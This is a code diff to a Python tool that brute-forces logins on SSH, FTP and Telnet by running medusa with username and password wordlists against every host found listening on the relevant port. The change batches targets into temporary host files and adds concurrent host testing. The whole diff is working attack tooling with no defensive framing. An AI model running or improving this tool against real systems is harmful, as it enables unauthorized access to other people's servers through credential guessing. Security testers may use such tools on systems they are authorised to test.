@@ -44,34 +44,50 @@ def ip_by_port(port):
 
 def brute_ssh():                    
     if not args.port:
-        port = 22
+        port = "22"
     else:
         port = args.port
-
-    outputlist = ip_by_port(port)
-    for ip in outputlist:
-        subprocess.call(['medusa', '-h', ip, '-U', 'wordlist/ssh/user', '-P', 'wordlist/ssh/password', '-M', 'ssh', '-t', args.threads, '-n', port])
+    tmp = "tmp/tmpssh"
+    with open(tmp, 'w+') as f:
+        outputlist = ip_by_port(port)
+        f.write('\n'.join(outputlist))
+        f.write('\n')
+        
+    subprocess.call(['medusa', '-H', tmp, '-U', 'wordlist/ssh/user', '-P', 'wordlist/ssh/password', '-M', 'ssh', '-t', args.threads, '-n', port, '-T', args.hosts])
+    
+    os.remove(tmp)
 
 def brute_ftp():
     if not args.port:
-        port = 21
+        port = "21"
     else:
         port = args.port
 
-    outputlist = ip_by_port(port)
-    for ip in outputlist:
-        subprocess.call(['medusa', '-h', ip, '-U', 'wordlist/ftp/user', '-P', 'wordlist/ftp/password', '-M', 'ftp', '-t', args.threads, '-n', port])
+    tmp = "tmp/tmpftp"
+    with open(tmp, 'w+') as f:
+        outputlist = ip_by_port(port)
+        f.write('\n'.join(outputlist))
+        f.write('\n')
         
+    subprocess.call(['medusa', '-H', tmp, '-U', 'wordlist/ftp/user', '-P', 'wordlist/ftp/password', '-M', 'ftp', '-t', args.threads, '-n', port, '-T', args.hosts])
+        
+    os.remove(tmp)
+
 def brute_telnet():
     if not args.port:
-        port = 23
+        port = "23"
     else:
         port = args.port
 
-    outputlist = ip_by_port(port)
-    for ip in outputlist:
-        subprocess.call(['medusa', '-h', ip, '-U', 'wordlist/telnet/user', '-P', 'wordlist/telnet/password', '-M', 'telnet', '-t', args.threads, '-n', port])
+    tmp = "tmp/tmptel"
+    with open(tmp, 'w+') as f:
+        outputlist = ip_by_port(port)
+        f.write('\n'.join(outputlist))
+        f.write('\n')
+        
+    subprocess.call(['medusa', '-H', tmp, '-U', 'wordlist/telnet/user', '-P', 'wordlist/telnet/password', '-M', 'telnet', '-t', args.threads, '-n', port, '-T' , args.hosts])
 
+    os.remove(tmp)
 
 def parse_args():
     
@@ -85,7 +101,9 @@ def parse_args():
     
     menu_group.add_argument('-s', '--service', help="specify service to attack", default="all")
 
-    menu_group.add_argument('-t', '--threads', help="number of medusa threads", default="2")    
+    menu_group.add_argument('-t', '--threads', help="number of medusa threads", default="2")
+    
+    menu_group.add_argument('-T', '--hosts', help="number of hosts to test concurrently", default="1")    
 
     menu_group.add_argument('-p', '--port', help="specify custom port for service to try") 
 
@@ -104,8 +122,15 @@ def parse_args():
 if __name__ == "__main__":
     print(banner)
     args,output = parse_args()
-    
-    
+    if not os.path.exists("tmp/"):
+        os.mkdir("tmp/")
+    tmppath = "tmp/"
+    filelist = os.listdir(tmppath)
+    for filename in filelist:
+        os.remove(tmppath+filename)
+   
+
+ 
     p_ssh = Process(target = brute_ssh)
     p_ftp = Process(target = brute_ftp)
     p_telnet = Process(target = brute_telnet)
